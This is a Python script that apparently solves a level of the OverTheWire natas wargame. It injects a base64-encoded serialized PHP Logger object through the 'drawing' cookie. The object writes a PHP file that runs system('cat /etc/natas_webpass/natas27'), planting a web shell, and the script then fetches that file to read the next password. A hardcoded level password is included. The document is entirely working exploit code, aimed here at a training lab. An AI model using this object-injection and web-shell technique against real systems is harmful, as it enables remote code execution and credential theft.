#!/usr/bin/env python3

import requests
import re
import base64
import urllib

username = 'natas26'
password = 'oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()
response = session.get(url, auth = (username, password))

session.cookies['drawing'] = 'Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxNDoiaW1nL3dpbm5lci5waHAiO3M6MTU6IgBMb2dnZXIAaW5pdE1zZyI7czo1MDoiPD9waHAgc3lzdGVtKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo1MDoiPD9waHAgc3lzdGVtKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO30='
response = session.get(url + "?x1=0&y1=0&x2=500&y2=500", auth = (username, password))


response = session.get(url + 'img/winner.php', auth = (username, password))
# print(response.text)
# print(session.cookies['PHPSESSID'])
# print(base64.b64decode(urllib.parse.unquote(session.cookies['drawing'])))
print(re.findall('(.*)', response.text)[0])